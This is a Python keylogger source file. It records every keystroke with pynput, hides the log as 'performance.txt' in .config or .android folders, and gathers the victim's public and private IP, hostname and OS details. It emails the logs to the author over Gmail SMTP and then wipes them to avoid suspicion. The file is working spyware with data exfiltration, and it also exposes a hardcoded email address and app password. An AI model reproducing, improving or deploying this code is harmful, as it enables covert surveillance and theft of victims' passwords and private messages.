import os
import platform;
import sys;
import socket;
import smtplib;
import multiprocessing;
from email.mime.text import MIMEText;
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
from typing import *;
from requests import get;
from pynput.keyboard import Listener, Key

FILEPATH = ""
KEYS: List[Key] = []
COUNT: int = 0

def main():
    global FILEPATH;
    filepath: str = ""
    filepath = makePath()  # Create the path for the files to be stored
    FILEPATH = filepath;

    # Create process to get info
    infoProcess = multiprocessing.Process(target=victimInfo(filepath))
    infoProcess.start()

    # Keylogger process runs
    with Listener(on_press=keyPress) as listener:
        listener.join()

    # Info process runs at the same time as well to not interrupt the keylogger
    infoProcess.join()

def keyPress(key: Key) -> None:
    """
    Function to deal with keys being pressed when listener captures them
    """
    global KEYS, COUNT

    KEYS.append(key)
    COUNT += 1
    if COUNT >= 1: # if we have more than one key in our KEYS array then we write
        COUNT = 0 # reset count
        writeKey(KEYS, FILEPATH);
        KEYS = [] # reset KEYS array

def writeKey(keys: List[Key], filepath: str) -> None:
    """ 
    This will write keys to a file that is created
    but checking what OS we are on to create the file accordingly
    the plan is to create the file in a folder that a normal
    person will not check in
    """
    fileSize: int = 0;

    with open(filepath, "a") as keyFile:
        for key in keys:
            k = str(key).replace("'", "") # Replace quotes that come with keys
            if k.find("space") > 0: # Check if it is a space character
                keyFile.write("\n")
            if k.find("Key") == -1: # Check if it is a special key
                keyFile.write(k)
        fileSize = os.path.getsize(filepath) # Check the size of the file and when it gets to a certain size send email
        if (fileSize % 1000 == 0): # Check size to send email and wipe the current text file to not arise suspiscion
            clear(filepath)

def victimInfo(filepath: str) -> None:
    """
    Function to get the information of the victims computer
    and add it to a text file
    """
    if (searchFile(filepath.replace("performance.txt", ""), "info.txt") is not None): # Check if we already got the info of this victim
        return;
    filePath: str = filepath.replace("performance.txt", "info.txt")

    with open(filePath, "w") as infoFile:
        hostname: str = socket.gethostname()
        privateIP: str = socket.gethostbyname(hostname)
        try:
            publicIp: str = get("https://api.ipify.org").text
            infoFile.write("Public IP: " + publicIp + "\n")
        except Exception:
            infoFile.write("Unable to get Public IP\n")
        infoFile.write("Processor: " + platform.processor() + "\n")
        infoFile.write("System: " + platform.system() + " " + platform.version() + "\n")
        infoFile.write("Machine: " + platform.machine() + "\n")
        infoFile.write("Hostname: " + hostname + "\n")
        infoFile.write("Private IP: " + privateIP)
    sendEmail(filePath)

def makePath() -> str:
    homepath: str = ""
    filepath: str = ""
    username: str = ""

    if os.name == "posix": # We are on a Linux or Mac sytem
        homepath = "/home/"  # Set Home Path that is usual for Mac and Linux
        try:
            username = os.getlogin() + "/" # We will try to get their username
            filepath = searchFile(homepath + username, ".config") # We will look for .config folder
            if filepath is None: # .config was not found then we will make one
                try:
                    os.makedirs(homepath + username + ".config")
                    filepath = homepath + username + ".config/performance.txt" # Set file path to in the directory that we created
                except OSError:
                    sys.exit(1)
            else:
                filepath = filepath + "/performance.txt"
                return filepath
        except Exception:
            sys.exit(1)
    elif os.name == "nt":
        homepath = "C:\\Users\\" # Set home path that is usual for Windows systems
        try:
            username = os.getlogin() + "\\" # We will attempt to get the username for the home directory
            filepath = searchFile(homepath + username, ".android") # We are looking for the .android folder to store our info
            if filepath is None: # .android folder was not found so we will create it
                try:
                    os.makedirs(homepath + username + ".android")
                    filepath = homepath + username + ".android\\performance.txt" # Set file path to the directory in Local
                except OSError:
                    sys.exit(1)
            else:
                filepath = filepath + "\\performance.txt"
            return filepath
        except Exception:
            sys.exit(1)

def searchFile(start: str, target: str) -> Union[str, None]:
    """
    Function to search if a file or folder exists in order to check
    for the existence of the .config file to store keylogs
    """
    for root, dir, file in os.walk(start):  # Search every directory and file
        if target in file or target in dir:
            return os.path.join(root, target)
    return None

def sendEmail(filePath: str) -> None:
    """
    Send email with current text in the keylogger file
    """
    # Add Mail Configuration
    smtp_server: str = "smtp.gmail.com"
    smtp_port: int = 587
    smtp_username: str = "kevincisneros29@gmail.com"
    smtp_password: str = "vrjatronwbyjullq"

    # Email Content
    sender: str = "kevincisneros29@gmail.com"
    recipient: str = "kevincisneros29@duck.com"
    subject: str = "Gifts"
    body: str = ""

    # Create a multipart message
    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender
    message['To'] = recipient

    # Add the email body
    message.attach(MIMEText(body, 'plain'))
    
    # Attach the file
    attachment = open(filePath, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={filePath}')
    message.attach(part)

    try:
        # Establish a connection to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()

        # Login to email account
        server.login(smtp_username, smtp_password)

        # Send the email
        server.sendmail(sender, recipient, message.as_string())

    except Exception as e:
        print('An error occurred while sending the email:', str(e))
    finally:
        # Close the connection to the SMTP server
        server.quit()

def clear(filepath: str):
    """
    Function sends the text file as an email to personal email
    and then clears out the current keys in the text file to not arise suspicion
    """
    sendEmail(filepath)
    with open(filepath, "w") as keyFile:
        keyFile.truncate(0)

if __name__ == "__main__":
    main()